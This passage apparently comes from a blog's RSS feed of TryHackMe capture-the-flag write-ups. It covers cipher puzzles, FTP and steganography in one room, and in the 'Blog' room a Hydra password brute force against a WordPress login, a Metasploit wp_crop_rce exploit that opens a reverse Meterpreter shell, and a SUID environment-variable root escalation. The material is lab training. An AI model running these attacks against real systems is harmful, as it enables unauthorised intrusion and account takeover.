&lt;p&gt;I tried rot13 and CyberChef, but they didn&amp;rsquo;t work. Anohter common way to ciphers is Vigenere Cipher, so I used &lt;a class=&#34;link&#34; href=&#34;https://www.boxentriq.com/code-breaking/vigenere-ciphers&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this tool&lt;/a&gt; to auto-decode without a key.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/JLV11bT.png&#34; alt=&#34;Results from vigenere ciphers tools&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We get the key after a lot of guesswork.&lt;/p&gt;
&lt;p&gt;PS: Do try this yourself, because a similar pattern is found later.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s move to another room.&lt;/p&gt;
&lt;h4 id=&#34;dining-room-2f-second-floor&#34;&gt;Dining Room 2F (Second Floor)&lt;/h4&gt;
&lt;p&gt;We see another code hidden in source-code. This time however, it does not look encoded. Instead, the length and the spaces tell me its a ROT version. ROT13 being the most common one, Let&amp;rsquo;s try it!&lt;/p&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;https://rot13.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ROT13&lt;/a&gt; we get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	&amp;lt;!-- You get the blue gem by pushing the status to the lower floor. The gem is on the diningRoom first floor. Visit ********.html --&amp;gt;       
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And doing this, we get another flag!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s move to tiger room.&lt;/p&gt;
&lt;h4 id=&#34;tiger-status-room&#34;&gt;Tiger Status Room&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/lEZhtJp.png&#34; alt=&#34;The Tiger Status Room asking for a jewel&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We get the blue gem flag, and input it here. Also, if I do not mention about the source code comments or some shady stuff, its because it is not there.&lt;/p&gt;
&lt;p&gt;Anyways, we get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;crest 1:
{key was here}
Hint 1: Crest 1 has been encoded twice
Hint 2: Crest 1 contanis 14 letters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We&amp;rsquo;ll come back to it then.&lt;/p&gt;
&lt;h4 id=&#34;gallery-room&#34;&gt;Gallery Room&lt;/h4&gt;
&lt;p&gt;We see another similar story, the note linked in this page reads the crest 2.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;crest 2:
{key was here}
Hint 1: Crest 2 has been encoded twice
Hint 2: Crest 2 contanis 18 letters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s keep going. We have study room, armour room and attic. Last two ask for a shield and study asks for a helmet. We start with attic then.&lt;/p&gt;
&lt;h4 id=&#34;attic&#34;&gt;Attic&lt;/h4&gt;
&lt;p&gt;We find crest 4 here&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;crest 4:
{key was here}
Hint 1: Crest 2 has been encoded twice
Hint 2: Crest 2 contanis 17 characters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;armour-room&#34;&gt;Armour Room&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;crest 3:
{key was here}
Hint 1: Crest 3 has been encoded three times
Hint 2: Crest 3 contanis 19 letters
Note: You need to collect all 4 crests, combine and decode to reavel another path
The combination should be crest 1 + crest 2 + crest 3 + crest 4. Also, the combination is a type of encoded base and you need to decode it
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;making-sense-of-the-mess&#34;&gt;Making Sense of the Mess&lt;/h4&gt;
&lt;p&gt;We have all the 4 crests, although they do not make any sense right now. One we have each of them decoded, we need to put them together and then decode once more.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crest1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CyberChef to the rescue!
&lt;img src=&#34;https://i.imgur.com/ixVUdKl.png&#34; alt=&#34;Cyberchef for crest1&#34;  /&gt;
We see it has 2 iterations: base64-&amp;gt; base 32.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crest2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Similarly, from base32 to base58.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crest3&lt;/strong&gt;
&lt;img src=&#34;https://i.imgur.com/CCMs4gg.png&#34; alt=&#34;CyberChef for crest3&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crest4&lt;/strong&gt;
&lt;img src=&#34;https://i.imgur.com/IcAqNqB.png&#34; alt=&#34;CyberChef for crest4&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;And we now combine them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FTP user: hunter, FTP pass: you_cant_hide_*******
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hell yes! We are done with this stuff. Now, onto FTP.&lt;/p&gt;
&lt;h3 id=&#34;13-ftp&#34;&gt;1.3. FTP&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.111.73
Connected to 10.10.111.73.
220 (vsFTPd 3.0.3)
Name (10.10.111.73:kali): hunter
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 1002     1002         4096 Sep 20  2019 .
drwxrwxrwx    2 1002     1002         4096 Sep 20  2019 ..
-rw-r--r--    1 0        0            7994 Sep 19  2019 001-key.jpg
-rw-r--r--    1 0        0            2210 Sep 19  2019 002-key.jpg
-rw-r--r--    1 0        0            2146 Sep 19  2019 003-key.jpg
-rw-r--r--    1 0        0             121 Sep 19  2019 helmet_key.txt.gpg
-rw-r--r--    1 0        0             170 Sep 20  2019 important.txt
226 Directory send OK.

...

ftp&amp;gt; 
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Get all the files. Ez.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat important.txt         
Jill,

I think the helmet key is inside the text file, but I have no clue on decrypting stuff. Also, I come across a /******_******/ door but it was locked.

From,
Barry
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;131-steganography&#34;&gt;1.3.1 Steganography&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile 001-key.jpg 
Enter passphrase: 
wrote extracted data to &amp;quot;key-001.txt&amp;quot;.

┌──(kali㉿kali)-[/tmp]
└─$ cat key-001.txt  
{key was here}
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ binwalk 003-key.jpg -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
1930          0x78A           Zip archive data, at least v2.0 to extract, uncompressed size: 14, name: key-003.txt
2124          0x84C           End of Zip archive, footer length: 22

┌──(kali㉿kali)-[/tmp]
└─$ cd _003-key.jpg.extracted 

┌──(kali㉿kali)-[/tmp/_003-key.jpg.extracted]
└─$ ls
78A.zip  key-003.txt

┌──(kali㉿kali)-[/tmp/_003-key.jpg.extracted]
└─$ cat key-003.txt          
{key was here}
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ strings 002-key.jpg 
JFIF
{key was here}
...
&amp;quot;*%%*424DD\
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Combine all of them and decode using cyberchef. Then,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ gpg helmet_key.txt.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and we have&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat helmet_key.txt
helmet_key{yee_haww}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;very nice. Back to Web Exploration huh?&lt;/p&gt;
&lt;h3 id=&#34;14-web-exploration---again&#34;&gt;1.4. Web Exploration - Again&lt;/h3&gt;
&lt;p&gt;Going to the closet room, we find two more pieces of information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SSH password: &lt;code&gt;*_*****_*****&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_******_***&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;https://www.boxentriq.com/code-breaking/vigenere-ciphers&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this automatic solver&lt;/a&gt; as we saw before, we get: &lt;code&gt;weasker login password stars members are my ****** ***&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Also, recall that the last time, we couldn&amp;rsquo;t epxlore the study room - because it required the helmet key which we didnt have. Exploring that, we get a &lt;code&gt;doom.tar.gz&lt;/code&gt; file. Very nice.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ tar -xzvf doom.tar.gz 
eagle_medal.txt
   
┌──(kali㉿kali)-[/tmp]
└─$ cat eagle_medal.txt 
SSH user: umbrella_guest
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ha! Easy!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Ah. Finally. We are done with the chaos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh umbrella_guest@10.10.111.73

{bla bla bla nothing interezting}

umbrella_guest@umbrella_corp:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Doing some exploration, we come across:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;umbrella_guest@umbrella_corp:/home/weasker$ cat weasker_note.txt 
Weaker: Finally, you are here, Jill.
Jill: Weasker! stop it, You are destroying the  mankind.
Weasker: Destroying the mankind? How about creating a &#39;new&#39; mankind. A world, only the strong can survive.
Jill: This is insane.
Weasker: Let me show you the ultimate lifeform, the {enemy name here}.

({enemy name here} jump out and kill Weasker instantly)
(Jill able to stun the tyrant will a few powerful magnum round)

Alarm: Warning! warning! Self-detruct sequence has been activated. All personal, please evacuate immediately. (Repeat)
Jill: Poor bastard

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We also find&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;umbrella_guest@umbrella_corp:~/.jailcell$ cat chris.txt 
Jill: Chris, is that you?
Chris: Jill, you finally come. I was locked in the Jail cell for a while. It seem that weasker is behind all this.
Jil, What? Weasker? He is the traitor?
Chris: Yes, Jill. Unfortunately, he play us like a damn fiddle.
Jill: Let&#39;s get out of here first, I have contact brad for helicopter support.
Chris: Thanks Jill, here, take this MO Disk 2 with you. It look like the key to deciphers something.
Jill: Alright, I will deal with him later.
Chris: see ya.

MO disk 2: albert 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv-Esc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;umbrella_guest@umbrella_corp:~$ sudo -l
[sudo] password for umbrella_guest: 
Sorry, user umbrella_guest may not run sudo on umbrella_corp.
umbrella_guest@umbrella_corp:~$ file / -type f -perm -u=s 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Both of them return nothing. :(&lt;/p&gt;
&lt;p&gt;How about the user weasker? Well we have something from before that we didn&amp;rsquo;t use uptill now.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;weasker login password stars members are my ****** ***&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;PS: use the same concept as we did for the html page above. And &amp;hellip; we are in!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;umbrella_guest@umbrella_corp:/home/weasker$ su weasker
Password: 
weasker@umbrella_corp:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;weasker@umbrella_corp:~$ sudo -l
Matching Defaults entries for weasker on umbrella_corp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weasker may run the following commands on umbrella_corp:
    (ALL : ALL) ALL

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is kinda cute. We are done! Such a long room damn. Fun though :D&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Blog Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-blog-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-blog-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/rP25U0x.png" alt="Featured image of post TryHackMe: Blog Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/blog&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;h3 id=&#34;11-nmap&#34;&gt;1.1 Nmap&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.129.188
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 04:01 EDT
Nmap scan report for 10.10.129.188
Host is up (0.21s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&amp;amp;#039;s IT Blog &amp;amp;#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2021-05-08T08:02:17+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-08T08:02:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.16 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The website seems to be broken, so I read the description. Let&amp;rsquo;s add the ip to the &lt;code&gt;/etc/hosts&lt;/code&gt; list.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                                        
127.0.0.1       localhost
127.0.1.1       kali
10.10.129.188   blog.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-exploration&#34;&gt;1.2 Exploration&lt;/h3&gt;
&lt;p&gt;Looking and exploring the website we have:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;comments and feed in the &lt;code&gt;meta&lt;/code&gt; section not too interesting&lt;/li&gt;
&lt;li&gt;Looked at the posts. Nothing in the post too interesting.&lt;/li&gt;
&lt;li&gt;Looked at both the authors (click on authors), we can see their usernames&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rP25U0x.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/8TjQfuU.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Interesting! So, &lt;code&gt;bjoel&lt;/code&gt; and &lt;code&gt;kwheel&lt;/code&gt; are two usernames we have.&lt;/p&gt;
&lt;h3 id=&#34;13-gobuster&#34;&gt;1.3 Gobuster&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.129.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/rss                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/feed/]
/login                (Status: 302) [Size: 0] [--&amp;gt; http://blog.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/0/]     
/feed                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/feed/]  
/atom                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/feed/atom/]
/wp-content           (Status: 301) [Size: 319] [--&amp;gt; http://10.10.129.188/wp-content/]
/admin                (Status: 302) [Size: 0] [--&amp;gt; http://blog.thm/wp-admin/]         
/rss2                 (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/feed/]        
/wp-includes          (Status: 301) [Size: 320] [--&amp;gt; http://10.10.129.188/wp-includes/]
/rdf                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/feed/rdf/]     
/page1                (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/]              
/&#39;                    (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/]              
/dashboard            (Status: 302) [Size: 0] [--&amp;gt; http://blog.thm/wp-admin/]          
/%20                  (Status: 301) [Size: 0] [--&amp;gt; http://10.10.129.188/]              

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing interesting. Looks like a WordPress CMS (no surprises - the template is from Frontity iirc).&lt;/p&gt;
&lt;h3 id=&#34;14-smb&#34;&gt;1.4 SMB&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s explore the SMB port that was open.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ smbclient -L 10.10.129.188 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy&#39;s local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.129.188/BillySMB -N
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9788312 blocks available
smb: \&amp;gt; get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (27.3 KiloBytes/sec) (average 27.3 KiloBytes/sec)
smb: \&amp;gt; get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (3.4 KiloBytes/sec) (average 17.0 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I have a feeling its a rickroll. Also, taylor swift uh huh. Plus, the author of the room mentioned to not go down &amp;ldquo;the rabbit hole&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Went to the qrcode link. Here&amp;rsquo;s not a rickroll XD&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=eFTLKWw542g&#34;&gt;https://www.youtube.com/watch?v=eFTLKWw542g&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ql3cqlS.png&#34; alt=&#34;image of the rabbithole images&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Clearly the rabbit hole.&lt;/p&gt;
&lt;h3 id=&#34;15-bruteforce-passwords&#34;&gt;1.5 Bruteforce passwords&lt;/h3&gt;
&lt;p&gt;I cant seem to find any creds lying around. So we&amp;rsquo;ll try getting into &lt;code&gt;bjoel&lt;/code&gt; and &lt;code&gt;kwheel&lt;/code&gt;&amp;rsquo;s accounts by bruteforcing with Hydra.&lt;/p&gt;
&lt;p&gt;First we want the form structure. So, I fired up burpsuite, and got the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /wp-login.php HTTP/1.1
Host: blog.thm

...

log=admin&amp;amp;pwd=admin&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;amp;testcookie=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay great! Let&amp;rsquo;s go for Hydra now.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;amp;testcookie=1:F=password&amp;quot;
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 06:33:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://blog.thm:80/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;amp;testcookie=1:F=password
[STATUS] 847.00 tries/min, 847 tries in 00:01h, 14343552 to do in 282:15h, 16 active
[STATUS] 845.00 tries/min, 2535 tries in 00:03h, 14341864 to do in 282:53h, 16 active
[80][http-post-form] host: blog.thm   login: kwheel   password: {hidden}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 06:37:11
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;So, now that we have the credentials &amp;hellip; so now what? Well whenever in doubt, we go back to the nmap scan. We see that the version 5.0 is being used. Looking it up, we have something tasty :D&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s fire up &lt;code&gt;msfconsole&lt;/code&gt; with the exploit &lt;a class=&#34;link&#34; href=&#34;https://blog.sonarsource.com/cms-image-remote-code-execution?redirect=rips&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here in detail&lt;/a&gt; and &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/49512&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;exploit-db&lt;/a&gt;. Setup &lt;code&gt;options&lt;/code&gt; and then &lt;code&gt;check&lt;/code&gt;. Looks vulnerable, lesgooo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf6 exploit(multi/http/wp_crop_rce) &amp;gt; exploit

[*] Started reverse TCP handler on 10.8.150.214:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.10.21.78
[*] Attempting to clean up files...
[*] Meterpreter session 2 opened (10.8.150.214:4444 -&amp;gt; 10.10.21.78:35590) at 2021-05-08 06:59:17 -0400

meterpreter &amp;gt; shell
Process 1745 created.
Channel 1 created.
bash -i
bash: cannot set terminal process group (983): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/cms$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So I checked the &lt;code&gt;bjoel/user.txt&lt;/code&gt;, but &amp;hellip; the classic &amp;ldquo;TRY HARDER&amp;rdquo; was shown to me ;-;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s now look for the PrivEsc.&lt;/p&gt;
&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s first look at who all have the set-uid bit.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@blog:/var/www/cms$ find / -type f -perm -u=s 2&amp;gt;/dev/null
find / -type f -perm -u=s 2&amp;gt;/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The thing that pops out is: &lt;code&gt;/usr/sbin/checker&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@blog:/var/www/cms$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;www-data@blog:/var/www/cms$ strings /usr/sbin/checker
strings /usr/sbin/checker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getenv
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=9       
AWAVI
AUATL
[]A\A]A^A_
admin
/bin/bash
Not an Admin
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;www-data@blog:/var/www/cms$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv(&amp;quot;admin&amp;quot;)                                  = nil
puts(&amp;quot;Not an Admin&amp;quot;)                             = 13
Not an Admin
+++ exited (status 0) +++
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay so. At this point I used nc to get the binary to my machine, and then, much later, realised that I went too complicated opening radare lol.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s what to do instead. Realise that &lt;code&gt;getenv(&amp;quot;admin&amp;quot;)&lt;/code&gt; means that we need some environmental variable. So,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@blog:/var/www/cms$ export admin=admin
export admin=admin
www-data@blog:/var/www/cms$ /usr/sbin/checker
/usr/sbin/checker
whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Very nice. Let&amp;rsquo;s also get the user flag while we are at it XD&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@blog:/var/www/cms# find / -type f -name user.txt 2&amp;gt;/dev/null
find / -type f -name user.txt 2&amp;gt;/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Blue Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-blue-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-blue-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/TqRvxBA.png" alt="Featured image of post TryHackMe: Blue Writeup" /&gt;&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;p&gt;Reconnaissance&lt;/p&gt;
